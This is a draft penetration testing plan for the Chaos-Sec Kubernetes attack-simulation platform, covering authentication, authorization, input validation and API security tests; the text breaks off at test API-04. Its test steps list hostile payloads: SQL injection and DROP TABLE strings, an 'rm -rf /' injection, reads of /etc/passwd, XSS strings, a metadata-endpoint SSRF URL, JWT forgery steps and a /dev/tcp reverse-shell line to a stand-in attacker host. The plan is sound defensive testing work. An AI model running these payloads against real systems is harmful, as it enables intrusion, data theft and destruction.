# Penetration Testing Plan

## Chaos-Sec: An Orchestration Platform for Security Control Validation

**Document ID:** CHAOS-SEC-PENTEST-001  
**Version:** 1.0  
**Status:** Draft  
**Last Updated:** 2026-01-15  
**Author:** Chaos-Sec Security Team

---

## Table of Contents

1. [Overview](#1-overview)
2. [Testing Methodology](#2-testing-methodology)
3. [Authentication Testing](#3-authentication-testing)
4. [Authorization Testing](#4-authorization-testing)
5. [Input Validation Testing](#5-input-validation-testing)
6. [API Security Testing](#6-api-security-testing)
7. [Kubernetes-Specific Testing](#7-kubernetes-specific-testing)
8. [SIEM Integration Testing](#8-siem-integration-testing)
9. [WebSocket Security Testing](#9-websocket-security-testing)
10. [Severity Rating Definitions](#10-severity-rating-definitions)
11. [Severity Matrix Summary](#11-severity-matrix-summary)
12. [Test Execution Guidelines](#12-test-execution-guidelines)
13. [Reporting Template](#13-reporting-template)
14. [Document History](#14-document-history)

---

## 1. Overview

This document provides a comprehensive penetration testing plan for the Chaos-Sec platform. Given that Chaos-Sec is a security validation platform that orchestrates simulated attacks against Kubernetes clusters, the stakes for its own security posture are exceptionally high. A compromise of the Chaos-Sec platform could allow an attacker to execute arbitrary attacks against production Kubernetes infrastructure, access sensitive security configurations, or tamper with experiment results and SIEM data.

### 1.1 Scope

| Scope Area | In Scope | Out of Scope |
|------------|----------|--------------|
| **REST API** (`/api/v1/*`) | ✅ All endpoints | — |
| **WebSocket connections** | ✅ Real-time event streams | — |
| **Authentication flows** | ✅ Login, refresh, logout, register | — |
| **Kubernetes integration** | ✅ Cluster management, attacker pod lifecycle | Physical K8s infrastructure |
| **SIEM integration** | ✅ Alert forwarding, health monitoring | SIEM provider internals |
| **Database** | ✅ Data access via API | Direct DB penetration |
| **Frontend** | ✅ XSS surface, CSRF vectors | Third-party CDN attacks |
| **Infrastructure** | ✅ Network policies, RBAC, pod security | Cloud provider internals |

### 1.2 Objectives

1. Verify that authentication controls resist brute force, token manipulation, and session hijacking.
2. Confirm that authorization enforces organization isolation (IDOR prevention) and role-based access.
3. Validate that all inputs are properly sanitized against injection attacks.
4. Ensure API security controls (rate limiting, CORS, headers, size limits) are effective.
5. Validate Kubernetes security boundaries cannot be bypassed from the platform.
6. Confirm SIEM integration cannot be tampered with or replayed.
7. Verify WebSocket connections enforce proper authentication and message integrity.

### 1.3 Pre-Conditions

- A dedicated test environment with a running Chaos-Sec instance.
- Test user accounts with different roles (`admin`, `operator`, `viewer`).
- Two separate organization accounts for IDOR testing.
- A configured SIEM integration (mock SIEM server).
- A connected Kubernetes cluster (test cluster only).
- Tools: `curl`, `sqlmap`, `Burp Suite`, `ZAP`, `hydra`, `jwt-tool`, custom Go scripts.

---

## 2. Testing Methodology

### 2.1 Approach

Testing follows the OWASP Testing Guide v4 methodology adapted for Kubernetes-native applications. Each test is classified by:

- **Category**: The security domain under test.
- **Test ID**: Unique identifier (e.g., `AUTH-01`).
- **Severity**: Critical / High / Medium / Low / Informational.
- **Status**: Not Started / In Progress / Pass / Fail / Partial.

### 2.2 Test Execution Order

Tests are executed in order of risk priority:

```
1. Authentication Tests (Critical — gateway to all other attacks)
2. Authorization Tests (Critical — data isolation boundary)
3. Input Validation Tests (High — application-level attacks)
4. API Security Tests (High — infrastructure-level controls)
5. Kubernetes-Specific Tests (Critical — infrastructure escape risk)
6. SIEM Integration Tests (Medium — data integrity risk)
7. WebSocket Security Tests (Medium — real-time attack surface)
```

---

## 3. Authentication Testing

### AUTH-01: Brute Force Protection

| Field | Value |
|-------|-------|
| **Test ID** | AUTH-01 |
| **Category** | Authentication |
| **Severity** | Critical |
| **OWASP Reference** | OTG-AUTHN-003 |

**Description:**  
Verify that the Chaos-Sec login endpoint (`POST /api/v1/auth/login`) is protected against brute force attacks. Attackers should not be able to guess passwords through repeated login attempts.

**Steps:**

1. Identify the login endpoint and required parameters (email, password).
2. Create a valid test user account with a known password.
3. Send 100+ login requests with an incorrect password for the same account from a single IP address.
4. Observe the server response after the rate limit threshold is exceeded (configured at 100 requests per minute by default).
5. Verify that subsequent requests return HTTP 429 Too Many Requests.
6. Verify the `Retry-After` header is present in 429 responses.
7. Verify the `X-RateLimit-Limit` and `X-RateLimit-Remaining` headers are set correctly.
8. Attempt the same attack from multiple different IP addresses to test distributed brute force resistance.
9. After the rate limit window expires, verify that legitimate login requests succeed.

**Expected Result:**

- Requests beyond the rate limit threshold return HTTP 429 with the body `{"error": "rate_limit_exceeded", "message": "Too many requests. Please slow down.", "code": 429}`.
- The `Retry-After` header is present with the window duration in seconds.
- The `X-RateLimit-Limit` header reflects the configured limit.
- The `X-RateLimit-Remaining` header decrements with each request.
- Legitimate requests succeed after the rate limit window resets.
- Account lockout after a reasonable number of failed attempts (as defined by the password policy: `lockout_threshold` and `lockout_duration_minutes`).

**Remediation if Failed:**

- Ensure `RateLimitMiddleware` is applied to the `/api/v1/auth/login` route.
- Implement per-account lockout after `lockout_threshold` (5) consecutive failures.
- Add CAPTCHA or progressive delay for repeated failures.

---

### AUTH-02: JWT Token Manipulation

| Field | Value |
|-------|-------|
| **Test ID** | AUTH-02 |
| **Category** | Authentication |
| **Severity** | Critical |
| **OWASP Reference** | OTG-SESS-010 |

**Description:**  
Verify that the system rejects JWT tokens that have been tampered with. The Chaos-Sec platform uses JWT (HS256) for authentication. An attacker should not be able to modify token claims (such as `role`, `permissions`, or `org_id`) and have the modified token accepted.

**Steps:**

1. Authenticate as a regular user and obtain a valid access token.
2. Decode the JWT payload (Base64URL decode the middle segment).
3. Modify the `role` claim from `viewer` to `admin`.
4. Modify the `permissions` array to include `["admin:all"]`.
5. Re-encode the modified payload and reconstruct the token with the same signature.
6. Send a request to a protected endpoint (e.g., `POST /api/v1/auth/register`) with the modified token.
7. Attempt the same with the `alg` header changed to `none` (algorithm confusion attack).
8. Attempt the same with the `alg` header changed to `RS256` while keeping an empty signature (key confusion attack).
9. Verify the server rejects all modified tokens with HTTP 401 Unauthorized.

**Expected Result:**

- All modified tokens are rejected with HTTP 401 and the body `{"error": "unauthorized", "message": "Invalid or expired authentication token.", "code": 401}`.
- The `none` algorithm attack is rejected — the `ValidateToken` method explicitly checks `token.Method.(*jwt.SigningMethodHMAC)` and rejects non-HMAC methods.
- The RS256 key confusion attack is rejected with an "unexpected signing method" error.
- No information about the JWT secret is leaked in error responses.

**Remediation if Failed:**

- Verify that `auth.AuthService.ValidateToken` uses `jwt.ParseWithClaims` with a key function that validates the signing algorithm.
- Ensure the JWT secret is sufficiently long and random (minimum 32 characters).
- Never accept tokens with `alg: "none"`.

---

### AUTH-03: Expired Token Rejection

| Field | Value |
|-------|-------|
| **Test ID** | AUTH-03 |
| **Category** | Authentication |
| **Severity** | High |
| **OWASP Reference** | OTG-SESS-007 |

**Description:**  
Verify that expired JWT access tokens and refresh tokens are properly rejected by the system. Access tokens have a configurable expiry (default 1 hour) and refresh tokens have a longer expiry (default 7 days).

**Steps:**

1. Obtain a valid access token through normal authentication.
2. Create a token with a very short expiry (or wait for the token to expire).
3. Send a request to a protected endpoint with the expired access token.
4. Verify the server returns HTTP 401 with the message "Authentication token has expired. Please refresh or log in again."
5. Obtain a refresh token and let it expire.
6. Attempt to refresh the expired refresh token via `POST /api/v1/auth/refresh`.
7. Verify the server rejects the expired refresh token.

**Expected Result:**

- Expired access tokens return HTTP 401 with `{"error": "unauthorized", "message": "Authentication token has expired. Please refresh or log in again.", "code": 401}`.
- Expired refresh tokens return HTTP 401.
- The `exp` claim is properly validated by the JWT library.
- Tokens with `iat` (issued-at) in the future are also rejected (`ErrTokenNotValidYet`).

**Remediation if Failed:**

- Ensure `ValidateToken` passes the `jwt.ErrTokenExpired` check correctly.
- Ensure the `AuthMiddleware` distinguishes between expired tokens and invalid tokens in error messages (without leaking sensitive information).

---

### AUTH-04: Session Hijacking Prevention

| Field | Value |
|-------|-------|
| **Test ID** | AUTH-04 |
| **Category** | Authentication |
| **Severity** | High |
| **OWASP Reference** | OTG-SESS-003 |

**Description:**  
Verify that the platform prevents session hijacking through token theft, session fixation, or concurrent session abuse.

**Steps:**

1. Authenticate and obtain an access token.
2. Attempt to use the same token from a different IP address (simulating token theft).
3. Attempt to use the same token from a different User-Agent.
4. Verify that the logout endpoint (`POST /api/v1/auth/logout`) properly blacklists the token in Redis.
5. After logout, attempt to use the same access token and verify it is rejected with HTTP 401 `token_revoked`.
6. Attempt to reuse a refresh token after it has been used for a refresh rotation (refresh token should be one-time use if rotation is implemented).

**Expected Result:**

- Tokens blacklisted after logout return `{"error": "token_revoked", "message": "This token has been revoked.", "code": 401}`.
- The blacklist key `token:blacklist:<token>` exists in Redis after logout.
- The `AuthMiddleware` checks the Redis blacklist before validating the token.
- If concurrent session limits are implemented, only the configured number of sessions should be allowed.

**Remediation if Failed:**

- Ensure the `LogoutHandler` adds the token to the Redis blacklist with a TTL matching the token's remaining lifetime.
- Ensure `AuthMiddleware` checks `m.rdb.Exists(ctx, blacklistKey)` before accepting any token.
- Implement refresh token rotation (each refresh token can only be used once).

---

### AUTH-05: Cross-Site Request Forgery (CSRF)

| Field | Value |
|-------|-------|
| **Test ID** | AUTH-05 |
| **Category** | Authentication |
| **Severity** | Medium |
| **OWASP Reference** | OTG-SESS-005 |

**Description:**  
Verify that the Chaos-Sec API is protected against CSRF attacks. Since the API uses Bearer token authentication, CSRF should be inherently mitigated, but additional protections should be verified.

**Steps:**

1. Verify that the API does not accept credentials via cookies (Bearer token only).
2. Verify the `SameSite` attribute on any cookies is set to `Strict` or `Lax`.
3. Verify the `Content-Type` validation rejects non-JSON content types for POST/PUT/PATCH requests.
4. Verify the CORS policy restricts which origins can make requests.
5. If CSRF tokens are implemented (header `X-CSRF-Token`), verify they are validated on every state-changing request.
6. Attempt to submit a state-changing request from a malicious origin and verify it is rejected.

**Expected Result:**

- The API uses Bearer token authentication via the `Authorization` header, which is not automatically sent by browsers (unlike cookies).
- Any cookies used have `SameSite=Strict`, `Secure`, and `HttpOnly` flags.
- The CORS middleware (`CORSMiddleware`) only allows specified origins and does not reflect arbitrary origins.
- Preflight OPTIONS requests are handled correctly with `Access-Control-Max-Age: 86400`.
- State-changing requests without the proper `Content-Type: application/json` header are rejected.

**Remediation if Failed:**

- Ensure no authentication tokens are stored in or sent via cookies that lack CSRF protection.
- Validate `Content-Type: application/json` on all POST/PUT/PATCH/DELETE endpoints.
- Configure `CORSMiddleware` with explicit allowed origins in production (not `*`).

---

## 4. Authorization Testing

### AUTHZ-01: Insecure Direct Object Reference (IDOR)

| Field | Value |
|-------|-------|
| **Test ID** | AUTHZ-01 |
| **Category** | Authorization |
| **Severity** | Critical |
| **OWASP Reference** | OTG-AUTHZ-004 |

**Description:**  
Verify that users cannot access resources belonging to other organizations. The Chaos-Sec platform enforces multi-tenancy through `OrgScopeMiddleware` and organization-scoped queries.

**Steps:**

1. Create two organizations (Org A and Org B) with separate user accounts.
2. Authenticate as User A (Org A) and create an experiment. Note the experiment ID.
3. Authenticate as User B (Org B) and attempt to access the experiment from Org A via:
   - `GET /api/v1/experiments/{experiment_id_from_org_a}`
   - `PUT /api/v1/experiments/{experiment_id_from_org_a}`
   - `DELETE /api/v1/experiments/{experiment_id_from_org_a}`
   - `POST /api/v1/experiments/{experiment_id_from_org_a}/execute`
4. Attempt to access Org A's clusters, templates, and reports from Org B's context.
5. Attempt to pass `?organization_id=<org_a_id>` in query parameters while authenticated as Org B.
6. Verify that all cross-organization access attempts are rejected.

**Expected Result:**

- All cross-organization access attempts return HTTP 403 Forbidden with `{"error": "forbidden", "message": "You can only access resources within your own organization.", "code": 403}`.
- The `OrgScopeMiddleware` properly validates `organization_id` query parameters against the token claims.
- Admin users (with `admin:all` permission) can access any organization's resources (expected admin override behavior).
- Database queries include organization ID filters that prevent data leakage at the query level.

**Remediation if Failed:**

- Ensure `OrgScopeMiddleware` is applied to all organization-scoped routes.
- Add organization ID filtering to all database queries at the repository level.
- Consider adding a Row-Level Security (RLS) policy in PostgreSQL as defense in depth.

---

### AUTHZ-02: Privilege Escalation (Role Bypass)

| Field | Value |
|-------|-------|
| **Test ID** | AUTHZ-02 |
| **Category** | Authorization |
| **Severity** | Critical |
| **OWASP Reference** | OTG-AUTHZ-003 |

**Description:**  
Verify that users with lower privilege roles cannot access endpoints or perform actions reserved for higher privilege roles. The Chaos-Sec RBAC model includes roles with specific permissions.

**Steps:**

1. Create three user accounts with different roles:
   - **Admin**: has `admin:all` permission
   - **Operator**: has `experiments:write`, `experiments:execute`, `clusters:read` permissions
   - **Viewer**: has `experiments:read`, `templates:read` permissions
2. Authenticate as the **Viewer** and attempt the following:
   - `POST /api/v1/experiments` (requires `experiments:write`) → should fail with 403
   - `POST /api/v1/experiments/{id}/execute` (requires `experiments:execute`) → should fail with 403
   - `DELETE /api/v1/experiments/{id}` (requires `experiments:delete`) → should fail with 403
   - `POST /api/v1/auth/register` (requires `admin:all` or `users:manage`) → should fail with 403
   - `POST /api/v1/clusters` (requires `clusters:write`) → should fail with 403
3. Authenticate as the **Operator** and attempt:
   - `POST /api/v1/auth/register` (requires `admin:all` or `users:manage`) → should fail with 403
   - `DELETE /api/v1/clusters/{id}` (requires `clusters:write`) → should fail with 403
4. Verify the error message format: `{"error": "forbidden", "message": "Permission 'X' is required.", "code": 403}`.

**Expected Result:**

- Every request to an endpoint requiring a permission the user lacks returns HTTP 403.
- The error message includes the specific required permission.
- The `RBACMiddleware` checks `claims.HasPermission()` for all required permissions.
- The `admin:all` permission grants access to all endpoints (admin bypass).
- No permission bypass is possible through HTTP method overrides or path manipulation.

**Remediation if Failed:**

- Verify that `RBACMiddleware` is applied to every route that requires specific permissions.
- Ensure the middleware cannot be bypassed by omitting the `Authorization` header or by manipulating the URL path.
- Verify that `HasPermission` correctly handles the `admin:all` wildcard.

---

### AUTHZ-03: Role Manipulation via API

| Field | Value |
|-------|-------|
| **Test ID** | AUTHZ-03 |
| **Category** | Authorization |
| **Severity** | High |
| **OWASP Reference** | OTG-AUTHZ-001 |

**Description:**  
Verify that a user cannot elevate their own role or permissions through API requests, including through the registration endpoint.

**Steps:**

1. Authenticate as a **Viewer** user.
2. Attempt to register a new user with admin privileges:
   ```json
   POST /api/v1/auth/register
   {
     "email": "newadmin@evil.com",
     "password": "SecurePass123!",
     "role": "admin",
     "permissions": ["admin:all"]
   }
   ```
3. Verify the request is rejected (403 — Viewer doesn't have `users:manage` permission).
4. Authenticate as an **Admin** and register a new user, then attempt to grant the new user `admin:all` permissions.
5. Verify that the registration endpoint ignores or overrides client-supplied `role` and `permissions` fields and assigns only the default viewer role unless the caller explicitly has user management permission.

**Expected Result:**

- The Viewer's request to `POST /api/v1/auth/register` returns HTTP 403.
- When an Admin creates a user, the `role` and `permissions` fields in the request body are validated against the admin's own permissions scope.
- The `RegisterHandler` does not blindly accept client-supplied role/permissions values.
- Users cannot self-assign elevated permissions.

**Remediation if Failed:**

- Ensure the `RegisterHandler` ignores or explicitly overrides `role` and `permissions` fields from the request body.
- Assign default roles based on a server-side configuration, not user input.
- Validate that the creating user's permissions are sufficient to grant the requested role.

---

## 5. Input Validation Testing

### INP-01: SQL Injection

| Field | Value |
|-------|-------|
| **Test ID** | INP-01 |
| **Category** | Input Validation |
| **Severity** | Critical |
| **OWASP Reference** | OTG-INPV-005 |

**Description:**  
Verify that all user inputs are immune to SQL injection attacks. The Chaos-Sec platform uses PostgreSQL as its primary database.

**Steps:**

1. Identify all API endpoints that accept user input:
   - `POST /api/v1/auth/login` (email, password fields)
   - `POST /api/v1/auth/register` (email, password, name fields)
   - `POST /api/v1/experiments` (name, description, parameters)
   - `GET /api/v1/experiments?search=` (search query)
   - `POST /api/v1/clusters` (name, description, endpoint)
2. For each input field, attempt the following payloads:
   - `' OR '1'='1` (classic tautology)
   - `" OR "1"="1` (double-quote variant)
   - `'; DROP TABLE users; --` (destructive injection)
   - `1 UNION SELECT NULL, NULL, NULL --` (UNION-based)
   - `1; SELECT pg_sleep(5) --` (time-based blind)
   - `admin'--` (comment-based bypass)
3. Verify that none of these payloads cause unexpected behavior, errors, or data leakage.
4. Use `sqlmap` against the login endpoint: `sqlmap -u "http://target/api/v1/auth/login" --method POST --data "email=test@test.com&password=test" --level 5 --risk 3`.
5. Verify the application uses parameterized queries (prepared statements) for all database interactions.

**Expected Result:**

- All SQL injection payloads are treated as literal strings, not SQL commands.
- The application returns appropriate error messages (400 Bad Request for invalid input, 401 Unauthorized for authentication failures) without exposing database errors.
- `sqlmap` reports no injectable parameters.
- Database queries use parameterized statements (`$1`, `$2`, etc.) through the `database/sql` package or ORM.
- Input validation rejects special characters in fields where they are not expected (e.g., email fields should not contain quotes).

**Remediation if Failed:**

- Switch all database queries to parameterized prepared statements.
- Add input validation middleware that rejects or sanitizes SQL metacharacters.
- Deploy a Web Application Firewall (WAF) rule for SQL injection patterns.
- Never concatenate user input into SQL strings.

---

### INP-02: Cross-Site Scripting (XSS)

| Field | Value |
|-------|
| **Test ID** | INP-02 |
| **Category** | Input Validation |
| **Severity** | High |
| **OWASP Reference** | OTG-INPV-001 |

**Description:**  
Verify that the Chaos-Sec platform is protected against both reflected and stored XSS attacks. User-supplied data must be properly escaped before rendering.

**Steps:**

1. Test reflected XSS in query parameters:
   - `GET /api/v1/experiments?search=<script>alert('XSS')</script>`
   - `GET /api/v1/templates?name=<img src=x onerror=alert(1)>`
2. Test stored XSS in request body fields:
   - `POST /api/v1/experiments` with `name: "<script>document.cookie</script>"`
   - `POST /api/v1/experiments` with `description: "<img src=x onerror=alert('XSS')>"`
   - `POST /api/v1/auth/register` with `email: "test<script>alert(1)</script>@example.com"`
3. Test DOM-based XSS:
   - Verify that the frontend properly sanitizes data before rendering.
4. Verify security headers that mitigate XSS:
   - `X-XSS-Protection: 1; mode=block`
   - `X-Content-Type-Options: nosniff`
   - `Content-Security-Policy: default-src 'self'`

**Expected Result:**

- The `SecurityHeadersMiddleware` and `SecurityHeaders()` middleware set `X-XSS-Protection: 1; mode=block` on all responses.
- The `Content-Security-Policy: default-src 'self'` header prevents inline script execution.
- The `X-Content-Type-Options: nosniff` header prevents MIME type sniffing.
- Stored XSS payloads are either rejected by input validation or sanitized before storage.
- API responses containing user-supplied data return the data as-is (JSON API) and rely on the frontend to escape it during rendering.
- No `<script>` tags or event handlers appear in rendered HTML output.

**Remediation if Failed:**

- Ensure `SecurityHeadersMiddleware` and `SecurityHeaders()` are applied globally.
- Add server-side input validation to reject or escape HTML entities in string fields.
- Implement Content Security Policy headers on all responses.
- Ensure the frontend uses framework-provided escaping (React's JSX, etc.) for all user-supplied data.

---

### INP-03: Command Injection

| Field | Value |
|-------|-------|
| **Test ID** | INP-03 |
| **Category** | Input Validation |
| **Severity** | Critical |
| **OWASP Reference** | OTG-INPV-012 |

**Description:**  
Verify that the platform is not vulnerable to OS command injection, particularly through Kubernetes manifest fields and experiment parameters that are processed by the backend.

**Steps:**

1. Identify fields that may be passed to shell commands or Kubernetes API:
   - Cluster API endpoints (`name`, `description`, `api_endpoint`, `ca_certificate`, `client_certificate`, `client_key`)
   - Experiment parameters (`namespace`, `parameters`)
   - Template fields (`name`, `slug`, `k8s_manifest`)
2. For each input field, attempt the following payloads:
   - `; ls -la /` (command chaining)
   - `| cat /etc/passwd` (pipe injection)
   - `$(whoami)` (command substitution)
   - `` `id` `` (backtick execution)
   - `\n/bin/bash -i >& /dev/tcp/attacker/4444 0>&1` (newline injection)
3. For Kubernetes-specific inputs (namespace, pod names):
   - Attempt to inject Kubernetes resource names like `; rm -rf /`
   - Attempt YAML injection in manifest fields.
4. Verify that no command is executed on the host system.

**Expected Result:**

- All command injection payloads are treated as literal strings.
- The Kubernetes client library (not shell commands) is used for all Kubernetes API interactions, preventing command injection.
- Input validation enforces valid DNS subdomain names for Kubernetes identifiers (RFC 1123).
- The `readOnlyRootFilesystem` security context is set on attacker pods.
- No error response leaks system information (OS type, file paths, etc.).

**Remediation if Failed:**

- Never use `exec.Command` or shell execution with user input.
- Use the Kubernetes client-go library for all Kubernetes API interactions.
- Validate that namespace names, pod names, and other identifiers conform to RFC 1123 DNS subdomain naming rules (`[a-z0-9]([-a-z0-9]*[a-z0-9])?`).
- Sanitize YAML input in manifest fields.

---

### INP-04: Path Traversal

| Field | Value |
|-------|-------|
| **Test ID** | INP-04 |
| **Category** | Input Validation |
| **Severity** | High |
| **OWASP Reference** | OTG-AUTHZ-006 |

**Description:**  
Verify that the platform is not vulnerable to path traversal (directory traversal) attacks, particularly through file upload endpoints and configuration parameters.

**Steps:**

1. Test path traversal in any file-related parameters:
   - `GET /api/v1/reports/../../../etc/passwd`
   - `GET /api/v1/templates/....//....//etc/passwd`
   - `POST /api/v1/clusters` with `ca_certificate: "file:///etc/passwd"`
2. Test URL-encoded path traversal:
   - `%2e%2e%2f` (`../`)
   - `%2e%2e/` (`../`)
   - `..%2f` (`../`)
   - `%2e%2e%5c` (`..\` on Windows)
3. Test null byte injection (if applicable):
   - `../../../etc/passwd%00.jpg` (null byte truncation)
4. Test in Kubernetes namespace fields:
   - `../../kube-system`

**Expected Result:**

- Path traversal sequences are stripped or rejected by input validation.
- File paths are resolved relative to a safe base directory and cannot escape it.
- The API returns 400 Bad Request for inputs containing `..`, null bytes, or other suspicious path sequences.
- Kubernetes namespace names with path traversal characters are rejected by DNS subdomain name validation.
- Certificate and key fields are validated as PEM-encoded data, not file paths.

**Remediation if Failed:**

- Validate and sanitize all file path inputs against a whitelist of allowed characters.
- Use `filepath.Clean()` and `filepath.Rel()` to resolve paths, then verify they remain within the base directory.
- Reject inputs containing `..`, null bytes (`\x00`), or URL-encoded path separators.
- Validate certificate/key inputs as PEM data, not file paths.

---

### INP-05: Null Byte Injection

| Field | Value |
|-------|-------|
| **Test ID** | INP-05 |
| **Category** | Input Validation |
| **Severity** | Medium |
| **OWASP Reference** | OTG-INPV-011 |

**Description:**  
Verify that null byte characters (`%00`, `\x00`) in user input are properly rejected. Null bytes can truncate strings in C-based systems and cause unexpected behavior in file operations, database queries, and Kubernetes API calls.

**Steps:**

1. Test null bytes in various input fields:
   - `POST /api/v1/experiments` with `name: "test\x00experiment"`
   - `POST /api/v1/auth/register` with `email: "user\x00@admin.com"`
   - `GET /api/v1/experiments/abc\x00123`
   - `POST /api/v1/clusters` with `name: "cluster\x00"`
2. Test URL-encoded null bytes:
   - `%00` in URL paths and query parameters
3. Test null bytes in Kubernetes namespace fields:
   - `namespace: "default\x00kube-system"`

**Expected Result:**

- All inputs containing null bytes are rejected with HTTP 400 Bad Request.
- Null bytes do not cause string truncation in any context (database, file system, Kubernetes API).
- Error messages do not reveal internal implementation details.
- The response body format is consistent: `{"error": "invalid_input", "message": "...", "code": 400}`.

**Remediation if Failed:**

- Add input validation that rejects any input containing null byte characters.
- Implement a global middleware that rejects requests with null bytes in URL paths or query strings.
- Validate that all string fields in request structs are null-byte-free before processing.

---

### INP-06: Server-Side Request Forgery (SSRF)

| Field | Value |
|-------|-------|
| **Test ID** | INP-06 |
| **Category** | Input Validation |
| **Severity** | High |
| **OWASP Reference** | OTG-INPV-007 (extended) |

**Description:**  
Verify that the platform cannot be used to make requests to internal services. The `clusters` endpoint accepts a `ca_certificate`, `client_certificate`, `client_key`, and `api_endpoint` — all potential SSRF vectors.

**Steps:**

1. Attempt to register a cluster with internal network endpoints:
   - `api_endpoint: "http://localhost:8080"` (loopback)
   - `api_endpoint: "http://169.254.169.254/latest/meta-data/"` (cloud metadata)
   - `api_endpoint: "http://10.0.0.1:6379"` (internal Redis)
   - `api_endpoint: "http://chaos-sec-backend:8080/api/v1/auth/me"` (self-reference)
2. Attempt DNS rebinding attacks:
   - Register a domain that resolves to an internal IP.
3. Attempt SSRF through Kubernetes API:
   - Submit a cluster endpoint that proxies to internal services.

**Expected Result:**

- Cluster registration validates that `api_endpoint` is a valid Kubernetes API URL.
- Internal/private IP addresses are rejected or explicitly allowed only for known internal clusters.
- Cloud metadata endpoints (169.254.169.254) are blocked.
- Self-referential URLs (pointing to the Chaos-Sec backend itself) are rejected.
- TLS certificate validation is enforced (no bypassing certificate checks).
- Network policies prevent attacker pods from accessing internal services.

**Remediation if Failed:**

- Validate and sanitize all URLs provided as cluster endpoints.
- Block private IP ranges, loopback addresses, and link-local addresses from being used as cluster endpoints.
- Use allowlists for known Kubernetes API server endpoints.
- Enforce HTTPS for all cluster API endpoints.

---

## 6. API Security Testing

### API-01: Rate Limiting

| Field | Value |
|-------|-------|
| **Test ID** | API-01 |
| **Category** | API Security |
| **Severity** | High |
| **OWASP Reference** | OTG-ATHZ-004 (extended) |

**Description:**  
Verify that rate limiting is properly enforced on all API endpoints. The Chaos-Sec platform implements both Redis-based and local rate limiters.

**Steps:**

1. Send requests to `/api/v1/auth/login` at a rate exceeding the configured limit (default: 100 requests per minute).
2. Verify that the response includes rate limit headers:
   - `X-RateLimit-Limit: 100`
   - `X-RateLimit-Remaining: <decreasing count>`
   - `X-RateLimit-Window: 1m0s`
3. After exceeding the limit, verify the response is HTTP 429 with:
   ```json
   {"error": "rate_limit_exceeded", "message": "Too many requests. Please slow down.", "code": 429}
   ```
4. Verify the `Retry-After` header (when using the `security.go` `RateLimit` middleware) or the `X-RateLimit-Window` header (when using `RateLimitMiddleware`).
5. Test that rate limiting works with Redis unavailable (fallback to local rate limiter).
6. Test rate limiting per user ID for authenticated requests (vs. per IP for anonymous requests).
7. Verify rate limits reset after the window expires.

**Expected Result:**

- Rate limiting returns HTTP 429 when the threshold is exceeded.
- Rate limit headers are present on all responses.
- Authenticated users are rate-limited by user ID (`rate_limit:user:<uuid>`), not just IP.
- Anonymous requests are rate-limited by client IP (`rate_limit:ip:<address>`).
- Rate limiting fails open if Redis is unavailable (local rate limiter takes over).
- Rate limits reset after the configured window duration.

**Remediation if Failed:**

- Ensure `RateLimitMiddleware` is applied to all routes (including public auth routes).
- Verify the Redis-based rate limiter uses a sliding window (ZSET) or fixed window (INCR+EXPIRE) correctly.
- Ensure the local rate limiter is initialized and functional for fallback.
- Add separate, stricter rate limits for login/registration endpoints.

---

### API-02: CORS Configuration

| Field | Value |
|-------|-------|
| **Test ID** | API-02 |
| **Category** | API Security |
| **Severity** | Medium |
| **OWASP Reference** | OTG-CONFIG-007 |

**Description:**  
Verify that Cross-Origin Resource Sharing (CORS) is configured securely. In production, only specific origins should be allowed; in development, a wildcard may be acceptable but should be explicitly documented.

**Steps:**

1. Send a preflight `OPTIONS` request with an `Origin` header that is not in the allowed list:
   ```
   OPTIONS /api/v1/auth/login HTTP/1.1
   Origin: https://evil.com
   ```
2. Verify the response does not include `Access-Control-Allow-Origin: https://evil.com`.
3. Send a request with an allowed origin and verify the `Access-Control-Allow-Origin` header is set correctly.
4. Verify the `Access-Control-Allow-Methods` header only includes necessary methods: `GET, POST, PUT, DELETE, PATCH, OPTIONS`.
5. Verify `Access-Control-Allow-Credentials: true` is only set when the origin is explicitly allowed.
6. Verify `Access-Control-Max-Age` is set appropriately (86400 seconds / 24 hours).
7. Test that the CORS policy does not reflect arbitrary `Origin` headers.

**Expected Result:**

- In production: only configured origins are allowed; arbitrary origins are rejected.
- The `Vary: Origin` header is present (prevents CDN/proxy caching of CORS responses).
- `Access-Control-Allow-Methods` does not include unnecessary methods (no TRACE, CONNECT).
- `Access-Control-Allow-Headers` is restricted to: `Content-Type, Authorization, X-Request-ID` (or `Origin, Content-Type, Accept, Authorization, X-Request-ID, X-API-Key`).
- Preflight requests receive 204 No Content responses.
- The wildcard `*` is not used in production environments.

**Remediation if Failed:**

- Configure `CORS()` middleware with explicit allowed origins in production.
- Remove the default `allowedOrigins = "*"` in production.
- Add the `Vary: Origin` header to all CORS responses to prevent caching attacks.
- Restrict `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` to minimum required.

---

### API-03: Security Headers

| Field | Value |
|-------|-------|
| **Test ID** | API-03 |
| **Category** | API Security |
| **Severity** | Medium |
| **OWASP Reference** | OTG-CONFIG-002 |

**Description:**  
Verify that all HTTP responses include the required security headers. The Chaos-Sec platform implements two middleware functions for security headers: `SecurityHeaders()` (in `security.go`) and `SecurityHeadersMiddleware()` (in `middleware.go`).

**Steps:**

1. Send a request to any API endpoint and inspect the response headers.
2. Verify the following headers are present and correctly configured:

| Header | Expected Value | Source |
|--------|---------------|--------|
| `X-Content-Type-Options` | `nosniff` | Both middleware |
| `X-Frame-Options` | `DENY` | Both middleware |
| `X-XSS-Protection` | `1; mode=block` | Both middleware |
| `Content-Security-Policy` | `default-src 'self'` | `security.go` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Both middleware |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Both middleware |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Both middleware (production only for middleware.go) |
| `Cache-Control` | `no-store` or similar | Should be present |

3. Verify `Strict-Transport-Security` is only set in production (not in development mode).
4. Verify headers cannot be overridden by the client.

**Expected Result:**

- All security headers are present on every response.
- `X-Frame-Options: DENY` prevents clickjacking.
- `X-Content-Type-Options: nosniff` prevents MIME sniffing.
- `Content-Security-Policy: default-src 'self'` restricts resource loading.
- `Strict-Transport-Security` enforces HTTPS in production.
- `Referrer-Policy: strict-origin-when-cross-origin` limits referrer leakage.
- `Permissions-Policy` restricts browser features.
- Headers cannot be removed or overridden by client requests.

**Remediation if Failed:**

- Ensure `SecurityHeaders()` or `SecurityHeadersMiddleware()` is registered as a global middleware in the router.
- Verify the middleware is applied before route-specific middleware.
- Add `Cache-Control: no-store` for API responses containing sensitive data.
- Consider adding `X-Request-ID` for request tracing.

---

### API-04: HTTP Method Override

| Field | Value |
|-------|-------|
| **Test ID** | API-04 |
| **Category** | API Security |
| **Severity** | Medium |
| **OWASP Reference** | OTG-CONFIG-006 |

**Description:**  
